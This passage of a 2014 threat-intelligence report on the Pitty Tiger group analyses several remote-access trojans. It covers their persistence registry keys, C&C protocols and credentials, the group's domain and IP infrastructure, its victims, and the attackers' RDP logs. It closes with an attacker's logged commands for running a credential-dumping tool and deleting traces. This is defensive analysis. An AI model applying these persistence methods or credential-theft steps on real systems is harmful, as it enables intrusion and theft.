    This RAT seems to be an evolution of PittyTiger, since a specific server binary we found could
    handle both requests from CT and PittyTiger, and was indicated as compatible with PittyTiger.
    Moreover, the same commands are implemented in both RATs.
    Installation
    Unsurprisingly, when running in our sandbox, the RAT triggers the same alarms as PittyTiger:
                                Alarms in our sandbox system, triggered by the CT RAT
    The binary drops two files in 
C:\Program Files\Internet Explorer
    1
        MD5 hash: f65dc0b3eeb3c393e89ab49a3fac95a8
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 19/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                      Files dropped by the CT RAT in our sandbox
    The 
ieupdate.exe
 is a simple binary to inject the DLL into 
explorer.exe
    Persistence is achieved via the following registry key:
              Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
              NT\CurrentVersion\Windows
              Value Name: load
              Value: c:\PROGRA~1\INTERN~1\ieupdate.exe
    After injection, the RAT sends a first login packet to its c&c:
                             Encrypted communication from a machine infected with CT RAT
    Command & Control
    The RAT communication is performed through HTTP requests. The data is sent encrypted with
    RC4, and base64-encoded. The RC4 key is the Unicode form of the requested URL.
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                        Page : 20/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    The Login packet contains the following string, after decoding and deciphering:
               Login
               ->C:PC-XXX
               ->U:User-XXX
               ->L:10.10.10.1
               ->S:Microsoft Windows XP Service Pack 3 5.1 2600
               ->M:Nov 13 2013
               ->P:1033
    It contains the computer name, the user name, the internal IP address, the OS version, the RAT
    internal version and the Language ID of the system.
    The RAT can then receive commands from its c&c. Usual RAT features are implemented:
       - File Download (GET) and Upload (PUT)
       - Remote shell (ocmd/ccmd)
       - Configuration update (cfg)
       - Sleep (sleep)
    Version and author(s)
    Regarding the configuration, our sample communicates with 
sop.avstore.com.tw
, and contains the
    string 
Nov 13 2013
, which should be a version identifier.
    The c&c part is a Windows binary written in .NET. We found 2 versions:
       - Version 2013.10: CT only controller
       - Version 2013.12: CT and PittyTiger controller
    The About form gives the name of the developer(s):
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 21/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                CT controller in action with a testing machine of ours
    The version of the controller which can handle both PittyTiger and CT shows the same author(s):
                                                CT/PittyTiger controller
    Public release
    Threat Intelligence
                                               
The Eye of the Tiger
                        Page : 22/58
                             Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    As these screenshots show, the switch between PittyTiger and CT was probably in the last semester
    of 2013.
    The text can be translated, thanks to Google Translate, as:
                 CT console (compatible pittytiger) v1.3
                 2013.12 by Trees and snow
    Further discussion about this author is provided in subsequent sections.
           MM RAT (AKA TROJ/GOLDSUN-B)
    We named this malware 
MM RAT
 at the beginning of our investigation, before we found an
    existing name for it, 
Troj/Goldsun-B
 according to Sophos. This is another remote administration
    tool often used by the Pitty Tiger crew. We have been able to acquire both a client and server part
    for it.
    Installation
    The binary we found is named 3200.exe1, and triggers the following alarms in our sandbox:
                          Alarms in our sandbox system, triggered by the Troj/Goldsun-B malware
    The 
release.tmp
 file is dropped on the system:
    1
        MD5 hash: 728d6d3c98b17de3261eaf76b9c3eb7a
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                           Page : 23/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                      File dropped by the malware in our sandbox
    The binary is also copied to the user
Application Data
 directory, and injects the 
release.tmp
 file
    in 
explorer.exe
    Persistence is achieved by adding the path to the binary to the Winlogon Shell key:
                 Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
                 NT\CurrentVersion\Winlogon
                 Value Name: Shell
                 Value: explorer.exe,C:\DOCUME~1\<UserName>\APPLIC~1\<binary name>,
    The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions.
    These addresses are listed below:
        -   63.251.83.36
        -   64.74.96.242
        -   69.251.142.1
        -   212.118.243.118
        -   216.52.184.230
        -   61.145.112.78
        -   218.16.121.32
    Command & Control
    It starts resolving its domains after injection, and immediately sends requests. First requests are
    used to check for updates (GET request on /httpdocs/update/update.ini). A Hello packet is then sent:
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 24/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                 Hello packet sent by Troj/Goldsun-B to its c&c server
    The bot then repeatedly sends GET requests on 
/httpdocs/mm/<bot_id>/ComMand.sec
 to retrieve
    remote commands.
    The communication protocol is quite simple: GET requests are used to receive data from the c&c,
    and POST requests to send data. In POST commands, the CGI name represents the command.
    The following features are implemented:
       - c&c authentication using password
       - Remote shell
       - Remote commands
       - File Download / Upload / Deletion / Search
       - Bot termination
    The following CGI files can be requested by the bot:
       - Vip: test for connectivity
       - Owpp4: register new bot
       - CReply: answer to remote commands
       - Clrf: clear remote file (to clear ComMand.sec after reading)
       - CFile: transmit file (file transfers or answers to commands)
       - Cerr: send error
    The configuration is stored locally in a file called 
schmup.sys
. The file is ciphered using RC4, using
    the MD5 hash of 
rEdstArs
 as the key.
    Our sample uses 
mca.avstore.com.tw
star.yamn.net
 and 
bz.kimoo.com.tw
 as c&c servers. It
    contains the 
1.6.0
 version number, and uses the password 
9ol.8ik,
 to authenticate with the bots.
    Unlike others c&c binaries, the c&c part of this RAT does not have a graphical interface, but can be
    remotely requested to manage the bots. Furthermore, no authentication is required to send
    commands to the c&c (but you need to know the configured password to interact with the bots).
    The management protocol is the same as the bots protocol, with different CGI files:
       - Shutdown: shutdown the c&c
       - Cnor: add a new command for a bot (writes it in 
ComMand.sec
       - Mlist: get the list of bots
       - Mlist2: write the list of bots to the file 
Online.dat
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 25/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    The bots
 answers to remote commands can be retrieved by requesting the 
Reply.sec
 file (e.g.
    GET /httpdocs/mm/<bot_id>/Reply.sec)
    Network patterns
    These network patterns might ring bells in some researcher
s minds. The network communication
    used by this binary are the same as those used by the Enfal malware, which has been used in the
    past by the Lurid group (APT attackers) and by other threat actors in China1.
    An examination of the code did not reveal code similarities with the Enfal malware. We do not
    currently know why this malware uses the same patterns to communicate.
            PALADIN RAT
    This is another remote administration tool used by the Pitty Tiger group. We have been able to get
    both a client and server part of it.
    Installation
    The binary we found was dropped by a malicious Word document. The following alarms are
    triggered in the sandbox:
                               Alarms in our sandbox system, triggered by the Paladin RAT
    The shellcode contained in the Word file drops the following file, and executes it:
       - C:\Documents and Settings\<User>\Local Settings\Temp\svohost.exe2
    This one drops in turn the following file:
    1
        http://la.trendmicro.com/media/misc/lurid-downloader-enfal-report-en.pdf
    2
        MD5 hash: 0567fd7484efbae502cac279d32ed518
    Public release
    Threat Intelligence
                                                  
The Eye of the Tiger
                        Page : 26/58
                                Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                      File dropped by the malware in our sandbox
    This tmp file is then copied to 
C:\Windows\system32\Nwsapagentex.dll
 and registered as a service
    called 
Nwsapagent
    This malware is a variant of the infamous Gh0st RAT1. Our specific sample uses 
ssss0
 instead of
    the usual 
Gh0st
 header for network communications.
    Command & Control
    The commands ID used in the communication protocol have also changed, but the features are
    quite the same.
    The configuration is directly embedded in the binary, and deciphered at runtime. Up to 5 c&c servers
    can be configured, but our sample only had one: 
ey.avstore.com.tw:53
    
 could stand for 
Ernst & Young
. It would not be very surprising, since a lot of different attack
    groups do use anti-virus vendors or other big company
s names to try to look more legitimate. Pitty
    Tiger is no exception, as detailed later in this report.
    We also found two c&c binaries, claiming to be versions 2.1 and 2.2 of the Paladin RAT controller.
    Version 2.1 answers to the 
ssss0
 header, while version 2.2 uses the classical 
Gh0st
 header.
                               Paladin controller used with one of our testing machines
    1
     http://www.mcafee.com/sg/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 27/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                          Paladin has multiple features: file transfer, screenshot, command shell 
          LEO RAT
    Additionally to the Paladin RAT, we found another variant of Gh0st RAT, named 
. Although we
    have found it on a c&c server of the group, there is no evidence that is has been used by the group,
    in opposition to Paladin which is used often by Pitty Tiger.
    Moreover, the built malware we found in the same folder was configured to connect to a local IP
    address, probably for testing purposes.
    Public release
    Threat Intelligence
                                                  
The Eye of the Tiger
                              Page : 28/58
                                Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                            Leo malware controller screenshot 
 a variant of Gh0st RAT
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                        Page : 29/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    INFRASTRUCTURE
    Our investigation has focused on three particular c&c servers used by the group. These c&c servers,
    unlike the other c&cs used by the group, have been misconfigured. Once parsed and dumped, it
    provided us with more insight.
    We found several domains used by the Pitty Tiger group, the most interesting ones being detailed in
    this chapter.
    Pitty Tiger, like other APT attackers, often use anti-virus 
familiar names
 when registering domains
    or creating subdomains. Some examples can be avstore.com.tw, sophos.skypetm.com.tw,
    symantecs.com.tw, trendmicro.org.tw etc.
            AVSTORE.COM.TW
        WHOIS Data
    The     registration   information   for    this   domain       has    been      the    same   since   2013-06-04:
                 Domain Name: avstore.com.tw
                    Registrant:
                 information of network company
                 longsa longsa33@yahoo.com
                       +86.88885918
                       No.520.spring road.shenyang
                 shanghai, shanghai
                       CN
    This information has been used to register another domain, skypetm.com.tw, which has also been
    used by the Pitty Tiger group.
        Malware families
    Our research also led us to the discovery of four different malware families connected to
    subdomains of avstore.com.tw:
        -    PittyTiger RAT (aka Backdoor:Win32/Ptiger.A)
        -    Troj/ReRol.A
        -    CT RAT
        -    Paladin RAT (variant of Gh0st RAT)
    MD5                                        Family                                   C&C
    Public release
    Threat Intelligence
                                                  
The Eye of the Tiger
                               Page : 30/58
                                Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    0d3b3b422044759b4a08a7ad8afe55c7                     Paladin dropper                     ey.avstore.com.tw
    75cf4f853f0f350fac9be87371f15c8d             Exploit:Win32/CVE-2012-2539                mac.avstore.com.tw
    b6380439ff9ed0c6d45759da0f3b05b8                 Troj/ReRol.A dropper                   sop.avstore.com.tw
    5e2360a8c4a0cce1ae22919d8bff49fd                      Troj/ReRol.A
    f65dc0b3eeb3c393e89ab49a3fac95a8
    e7dc3bbe8b38b7ee0e797a0e27635cfa                           CT RAT
    4ce8593c9de2b27b5c389f651c81638b                                                       chanxe.avstore.com.tw
                                                                                         jackyandy.avstore.com.tw
    8df89df484ca5c376b763479ea08d036                         PALADIN
    be18418cafdb9f86303f7e419a389cc9                      Pitty Tiger RAT                jackyandy.avstore.com.tw
                                        MD5 hashes of files linked to avstore.com.tw
                      Links between malware samples, malware families, and avstore.com.tw subdomains
    Public release
    Threat Intelligence
                                                   
The Eye of the Tiger
                               Page : 31/58
                                 Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
         C&C servers and IP addresses
    Hosting company             Geolocation        IP Range            IP Address         Host                       Time space
    HongkongDingfengxinhuiBgp   Kowloon, Hong      122.10.0.0 
        122.10.48.189      chanxe.avstore.com.tw      Actually in use
    Datacenter                  Kong               122.10.63.255
                                                                                          jackyandy.avstore.com.tw
    Hurricane Electric Inc      Fremont, USA       66.220.0.0 
        66.220.4.100       mac.avstore.com.tw         Actually in use
                                                   66.220.31.255
                                                                                          sop.avstore.com.tw
                                                                                          ey.avstore.com.tw
    New World Telephone LTD     Hong Kong City,    58.64.175.0 
       58.64.175.191      jackyandy.avstore.com.tw   Dec. 2013
                                Hong Kong          58.64.175.255
                                        Avstore.com.tw infrastructure: hosting and subdomains
             SKYPETM.COM.TW
       WHOIS Data
    This domain has shown two different WHOIS entries through time:
    Public release
    Threat Intelligence
                                                       
The Eye of the Tiger
                                     Page : 32/58
                                     Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
        -    From 2011-12-29 to 2013-01-02 :
            Registrant :chenzhizhong
            Email : hurricane_huang@163.com
            Telephone : +86.2426836910
        -    From 2013-11-21 until today :
            Registrant : long sa
            Email : longsa33@yahoo.com
            Telephone : +86.88885918
    The most recent registration information is also used for avstore.com.tw.
        Malware families
    Six malware families have been identified as communicating with subdomains of skypetm.com.tw:
        -    MM RAT
        -    Pitty Tiger RAT
        -    Troj/ReRol.A
        -    CT RAT
        -    Paladin
        -    Exadog
                     MD5                                     Malware family                          C&C server
    81fa811f56247c236566d430ae4798eb                            MM RAT                          ms11.skypetm.com.tw
    55e456339936a56c73a7883ea1ddb672                     Backdoor:Win32/Ptiger.A               botemail.skypetm.com.tw
    d5da60d678d5a55a847e1e6723c7a4d0                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw
    0750569cf1733d4fbb01169476387cc2                     Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw
                                                                                                zeng.skypetm.com.tw
    abb0abfab252e4bfb9106273df3c1c2                      Backdoor:Win32/Ptiger.A                 aniu.skypetm.com.tw
                                                                                                zeng.skypetm.com.tw
    c0656b66b9f4180e59e1fd2f9f1a85f2                           Troj/Rerol.A                     zeng.skypetm.com.tw
    ce15fa3338b7fe780e85c511d5e49a98                           Troj/Rerol.A                     zeng.skypetm.com.tw
    8a54adb3976d1c03605656ca55be7400                     Backdoor:Win32/Ptiger.A                super.skypetm.com.tw
    a1ea6dc12b983c7262fe76c1b3663b24                     Backdoor:Win32/Ptiger.A                qinoo.skypetm.com.tw
    b6380439ff9ed0c6d45759da0f3b05b8                       Troj/Rerol.A dropper                sophos.skypetm.com.tw
    5e2360a8c4a0cce1ae22919d8bff49fd                           Troj/ReRol.A                    sophos.skypetm.com.tw
    79e48961d1ee982a466d222671a42ccb                           Troj/ReRol.A                    sophos.skypetm.com.tw
    4ab74387f7a02c115deea2110f961fd3                             ReRol.A                       sophos.skypetm.com.tw
    bf95e89906b8a17fd611002660ffff32                           Troj/ReRol.A                    sophos.skypetm.com.tw
    CONTAINS VICTIM INFORMATION                     Office Word file - Rerol.A dropper         sophos.skypetm.com.tw
    4ce8593c9de2b27b5c389f651c81638b                             CT RAT                        newb02.skypetm.com.tw
    8df89df484ca5c376b763479ea08d036                             Paladin                       newb02.skypetm.com.tw
    22e47c5e3809a4150d0db7fc99a68cc0                    Office Excel file 
 Rerol.A             margo.skypetm.com.tw
                                                                 dropper
    dd87c68c1e71bb104a48a6be87a2349f                     Backdoor:Win32/Ptiger.A                ripper.skypetm.com.tw
    068870c2c165a1d29fc2f3d3edfed3ae                        Win32/Exadog.AA                       link.skypetm.com.tw
    Unknown                                              Backdoor:Win32/Ptiger.A                 asdf.skypetm.com.tw
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                                 Page : 33/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                   Skypetm.com.tw infrastructure: subdomains and malware linked to it
    Hosting Company       Geolocalisation        IP Range            IP Address          C&C server                Timeline
    Take 2 Hosting Inc.   San Jose, USA          173.252.192.0 -     173.252.198.103     newb02.skypetm.com.tw     Actually in use
                                                 173.252.255.255
    Hurricane Electric    Fremont USA            66.220.0.0 -        66.220.4.100        sophos.skypetm.com.tw     Actually in use
    Inc.                                         66.220.31.255
    Taiwan Academic       Taipei, Taiwan         210.60.0.0 -        210.60.141.45       botemail.skypetm.com.tw   2012-03-06
    Network                                      210.60.255.255
    Gorillaservers Inc.   Los Angeles, USA       198.100.96.0 -      198.100.121.15      sophos.skypetm.com.tw     ?
                                                 198.100.127.255
    Gorillaservers Inc.   Los Angeles, USA       198.100.96.0 -      198.100.121.15      margo.skypetm.com.tw      2013-11-22
                                                 198.100.127.255
    Webnx Inc.            Los Angeles, USA       216.18.192.0 -      216.18.208.4        botemail.skypetm.com.tw   2013-04-04/2013-
                                                 216.18.223.255                                                    12-16
    Webnx Inc.            Los Angeles, USA       216.18.192.0 -      216.18.208.4        qinoo.skypetm.com.tw      ?
                                                 216.18.223.255
    Data                  Taipei, Taiwan         59.112.0.0 -        59.120.84.230       botemail.skypetm.com.tw   2012-03-12/2012-
    Communication                                59.123.255.255                                                    04-28
    Business Group
    Data                  Taipei, Taiwan         211.75.128.0 -      211.75.195.1        super.skypetm.com.tw      2011-08-30/2013-
    Communication                                211.75.255.255                                                    12-16
    Business Group
    Public release
    Threat Intelligence
                                                             
The Eye of the Tiger
                                     Page : 34/58
                                           Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    Data              Taipei, Taiwan         61.220.0.0 -          61.220.44.244     aniu.skypetm.com.tw    2013-04-05/2013-
    Communication                            61.227.255.255                                                 12-16
    Business Group
    Data              Taipei, Taiwan         61.220.0.0 -          61.220.44.244     zeng.skypetm.com.tw    ?
    Communication                            61.227.255.255
    Business Group
    Data              Taipei, Taiwan         61.220.0.0 -          61.220.209.17     qinoo.skypetm.com.tw   ?
    Communication                            61.227.255.255
    Business Group
    New World         Hong Kong City,        113.10.169.0 -        113.10.169.162    margo.skypetm.com.tw   Actually in use
    Telephone Ltd.    Hong Kong              113.10.169.255
    New World         Hong Kong City,        58.64.185.0 -         58.64.185.200     zeng.skypetm.com.tw    2013-12-16/2013-
    Telephone Ltd.    Hong Kong              58.64.185.255                                                  12-16
    New World         Hong Kong City,        113.10.240.0 -        113.10.240.54     qinoo.skypetm.com.tw   ?
    Telephone Ltd.    Hong Kong              113.10.240.255
    New World         Hong Kong City,        113.10.221.0 -        113.10.221.126    zeng.skypetm.com.tw    ?
    Telephone Ltd.    Hong Kong              113.10.221.255
    New World         Hong Kong City,        113.10.240.0 -        113.10.240.50     link.skypetm.com.tw    2012-12-21/2013-
    Telephone Ltd.    Hong Kong              113.10.240.255                                                 12-16
    Asia Data (hong   Hong Kong City,        101.1.17.0 -          101.1.25.74       zeng.skypetm.com.tw    Actually in use
    Kong) Limited     Hong Kong              101.1.31.255
    Isp Satellite     Hong Kong City,        202.174.130.0 -       202.174.130.110   ms11.skypetm.com.tw    2011-02-27/2013-
    Broadband         Hong Kong              202.174.130.255                                                12-16
    Provider
    Jeongkyunghee     Anyang, South          221.144.0.0 -         221.150.164.114   link.skypetm.com.tw    2011-06-29/2012-
                      Korea                  221.168.255.255                                                12-18
             COMMON CHARACTERISTICS BETWEEN THE TWO DOMAINS
          Malware families and samples
    Avstore.com.tw and skypetm.com.tw have 4 malware families in common, communicating to
    subdomains of both domains:
    Public release
    Threat Intelligence
                                                            
The Eye of the Tiger
                               Page : 35/58
                                       Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
             Links between malware samples, IP addresses and c&cs associated to avstore.com.tw and skypetm.com.tw
          OTHER DOMAINS LINKED WITH THE PITTY TIGER GROUP
    Domain                    Shares         with                             Comment
    paccfic.com               Whois          acers.com.tw,
                              information    foxcom.com.tw,
                                              dopodo.com.tw,
                                             stareastnet.com.tw
    webconference.com.tw      Whois          techsun.com.tw
                              information
    Public release
    Threat Intelligence
                                                     
The Eye of the Tiger
                           Page : 36/58
                                   Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                          IP Address     techsun.com.tw,
                                         trendmicro.org.tw
    stareastnet.com.tw    Whois          acers.com.tw,                     Two PittyTiger malware and a CT RAT have been
                          information    foxcom.com.tw,                    pointing to several stareastnet.com.tw subdomains.
                                         dopodo.com.tw,
                                         paccfic.com
                          IP Address     dopodo.com.tw,
                                         foxcom.com.tw,
                                         kimoo.com.tw,
                                         symantecs.com.tw
    symantecs.com.tw      Whois          trendmicroup.com                  A pittytiger dropper, a Paladin malware and a CT RAT have been
                          information                                      pointing to several symantecs.com.tw subdomains.
                          IP Address     dopodo.com.tw,
                                         foxcom.com.tw,
                                         kimoo.com.tw,
                                         stareastnet.com.tw,
                                         wmdshr.com,
                                         trendmicro.org.tw
    trendmicroup.com      Whois          symantecs.com.tw
                          information
    trendmicro.org.tw     Whois          Skypetm.com.tw,                   A paladin and a PittyTiger malware have been pointing to several
                          information    avstore.com.tw                    trendmicro.org.tw subdomains.
                          IP Address     webconference.com.tw,
                                         techsun.com.tw,
                                         skypetm.com.tw,
                                         kimoo.com.tw,
                                         symantecs.com.tw,
                                         hdskip.com
    lightening.com.tw     Whois          helosaf.com.tw,                   Paladin and PittyTiger samples has been pointing to several
                          information    seed01.com.tw                     lightening.org.tw subdomains.
                          IP Address     seed01.com.tw,
    techsun.com.tw        Whois          webconference.com.tw
                          information
                          IP Address     webconference.com.tw,
                                         trendmicro.org.tw
    dopodo.com.tw         Whois          acers.com.tw,
                          information    foxcom.com.tw,
                                         stareastnet.com.tw
                          IP Address     stareastnet.com.tw,
                                         symantecs.com.tw,
                                         kimoo.com.tw
    foxcom.com.tw         Whois          acers.com.tw,
                          information    dopodo.com.tw,
                                         stareastnet.com.tw
                          IP Address     stareastnet.com.tw,
                                         symantecs.com.tw,
                                         kimoo.com.tw
    acers.com.tw          Whois          acers.com.tw,
                          information    foxcom.com.tw,
                                         stareastnet.com.tw
                          IP Address     symantecs.com.tw,
                                         wmdshr.com,
                                         kimoo.com.tw
                                        Links between domains used by Pitty Tiger
    Public release
    Threat Intelligence
                                                  
The Eye of the Tiger
                                     Page : 37/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                          Timeline of Pitty Tiger domains registration information, based on e-mail address
    Some domains registered by the group are very old. There is an increase in the registrations from
    2010 on. All the e-mail addresses used are connected to the Pitty Tiger group.
    Public release
    Threat Intelligence
                                                      
The Eye of the Tiger
                                  Page : 38/58
                                    Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    VICTIMS
    Mapping the victims of such a targeted campaign is not an easy task.
    We have found the Pitty Tiger group to be very active against one particular private company from
    the defense industry and one academic network of a government, , yet we think it was done to be
    used as a proxy for some of the group
s operations.
    We have also found some connections from other companies to the c&c servers, yet we did not find
    evidence that they were real victims.
    These alleged victims do work in different sectors and are located mostly in European countries.
        
   1 company from the defense industry;
        
   1 company from the energy industry;
        
   1 company from the telecommunications industry;
        
   1 company specialized in web development.
    It might be surprising to see a company specialized in web development here, yet it has built
    websites for interesting potential targets. We suspect Pitty Tiger to use this compromise to spear
    phish other companies which are in commercial relation with this web development company.
    We have to mention that we only had access to three of the several attackers
 servers. Therefore,
    we suppose the Pitty Tiger group could have more targets than what we could confirm.
    We also found a lot of vulnerability scanners launched by the attackers at different targets, yet there
    was no sign of compromise.
    During the course of our investigations, we discovered a RAR archive on the attacker
s server
    containing 5 Word documents and one small C source code. These documents belong to the
    defense company which has been compromised. According to the name of the files and the general
    feel of the archive, we do think it was extracted by the attackers to 
show
 someone what kind of
    data they could get from the compromise of that particular target. The documents were still
    exhibiting comments from various users, showing it was an ongoing work and not old documents.
    Interestingly enough, we saw a part of these documents appear on Virus-Total, with an additional
    
gift
 from the attackers, a payload dropping a malware.
    There are only two options we can think of here:
       
 Someone from the same company has been targeted with this document.
       
 Someone from another company has been targeted with this document. This other company
           could be a partner or competitor.
    Since we were unable to determine the intended use of this specific document, we can only suppose
    that it could be used to provide commercial advantages to competitors of that company, or used by
    a foreign state.
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 39/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    ATTACKERS
    During our investigation, we found out interesting information about the Pitty Tiger group itself. After
    analyzing the various collected elements, we have tried to draw a portrait of this particular threat.
          ATTACKER
S CONNECTIONS TO THE C&C
    We have been able to get all the RDP connections logs to one c&c server:
                     COMPUTER NAME              OCCURENCES IP ADDRESSES COUNTRY
                                                                         23.226.178.162             USA
                                                                          27.155.90.80              China
                                                                         27.155.110.81              China
                                                                         27.156.49.223              China
                                                                          58.64.177.60            Hong Kong
                                                                          59.53.91.33               China
                                                                         103.20.192.11            Hong Kong
                     50PZ80C-1DFDCB8                     65              110.90.60.250              China
                                                                          110.90.61.69              China
                                                                         110.90.62.185              China
                                                                         120.32.113.97              China
                                                                         120.32.114.209             China
                                                                         121.204.33.130             China
                                                                         121.204.33.153             China
                                                                         183.91.52.230            Hong Kong
                                                                          27.151.0.224              China
                                                                         27.155.109.89              China
                           FLY-THINK                     11
                                                                         121.204.88.120             China
                                                                         120.32.114.139             China
                          TIEWEISHIPC                     2              27.16.139.143              China
                           CHMXY-PC                       1                58.61.40.5               China
     RDP connections from attackers machines to one particular c&c, from beginning of April 2014 to beginning of July 2014
    These connections are either VPS or dynamic IP addresses, mostly from China.
    A computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5. The IP is
    in an ADSL dynamic pool in the Gangzhou area (Guangdong province):
    Public release
    Threat Intelligence
                                                    
The Eye of the Tiger
                                  Page : 40/58
                                  Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                          IP address used by CHMXY-PC
    A few connections to the c&c were done by a computer named TIEWEISHIPC with IP address
    27.16.139.143. This IP address belongs to an ADSL dynamic pool in the Wuhan area (Hubei
    provincial capital).
                                   IP address used by TIEWEISHIPC computer
    Some connections to the c&c originated from a computer named FLY-THINK with several IP
    addresses, all located in Fuqing (Fujian province). The IP addresses are in an ADSL dynamic pool:
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                        Page : 41/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                  IP addresses used by the FLY-THINK machine
    Most of the connections to the c&c server were coming from a computer named 50PZ80C-
    1DFDCB8 with several IP addresses. There are 11 IP addresses from Chinese dynamic ADSL
    ranges: 9 from Fuqing (Fujian province), one from Fuzhou (Fujian
s province capital) and one from
    Nanchang (Jiangxi
s province capital). The last one came from a VPS instance located in Los
    Angeles (California, USA) but purchased by a China based VPS provider XeVPS which belong to
    the AS38197 (Sun Network Hong Kong Limited).
                              IP addresses used by the 50PZ80C-1DFDCB8 machine
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                        Page : 42/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    The two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to
    connect to the c&c, yet some of these IP addresses come from the same IP range:
                          IP ranges overlapping between two machines used by the attackers
    We mapped these RDP connections to have a graphical view:
    Public release
    Threat Intelligence
                                               
The Eye of the Tiger
                        Page : 43/58
                             Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                     RDP connections from the attackers to one c&c server
          
TOOT
    We found that a member of this group of attackers used some tools on his own system, for testing
    purposes. This information was still available when we got access to the c&c server.
    He launched some tests with the CT RAT we exposed earlier:
                          User 
Toot
 logging on the CT RAT on machine 
toot-2a601225a8
, 2014/02/10
    Public release
    Threat Intelligence
                                                     
The Eye of the Tiger
                            Page : 44/58
                                   Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                          User 
Toot
 logging on the CT RAT on machine 
toot-2a601225a8
, 2014/04/09
                          User 
Toot
 logging on the CT RAT on machine 
toot-2a601225a8
, 2014/04/09
    Here we can see a user 
Toot
 from a machine named 
toot-2a601225a8
 logging in the CT RAT
    and executing some commands. The c&c IP address, 198.100.113.27, can be seen there. Other log
    files showed that 
Toot
 is using virtual machines for his tests.
    We can also see the system: Microsoft Windows XP SP3. The 
 field is the language ID.
    Public release
    Threat Intelligence
                                                     
The Eye of the Tiger
                            Page : 45/58
                                   Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    1028 means 
Chinese traditional
. We have also seen tests run by 
toot
 with a language ID of 2052,
    which is 
Chinese simplified
    The 
 field is probably used for versioning. It is a hardcoded string in the binary.
    After these tests, we could see some real connections to a victim using this RAT. Here is a follow-up
    of the commands launched by the bot controller, in a standard command-line shell:
    Command                                       Effect
    cd\temp                                       Folder change
    Dir                                           Lists the content of the folder. The
                                                  attacker here is probably looking for his
                                                  tools and does not remember if they
                                                  are there or in system32.
    cd\windows\system32                           Folder change
    dir tools*                                    Looking for tools.exe, a tool to fetch
                                                  different kind of credentials on the
                                                  system
    tools                                         The attacker wants to see what the
                                                  options are for the tool.
    tools 
all                                    Tools.exe is launched.
                                                  At this point, the output shows the
                                                  attackers only gets successfully one
                                                  MSN credential in clear text, login and
                                                  password, and one Microsoft Outlook
                                                  credential.
    type iecache.txt                              Shows the Internet Explorer cache to
                                                  the attacker. The output is huge.
    dir cmd.exe                                   Looking for cmd.exe
    del tools.exe                                 Remove the tools.exe after its use
    dir tools.exe                                 Checks to see if it has been
                                                  successfully deleted
    del iecache.txt                               Removes the IE cache log file.
    regedit -e 1.reg                              Dumps the content of this key to a file
    "HKEY_CURRENT_USER\Software\Microsoft\Windows named 1.reg
    NT\CurrentVersion\Windows"
    type 1.reg                                    Checks if dump has been successful.
    del 1.reg                                     Deletes the dump
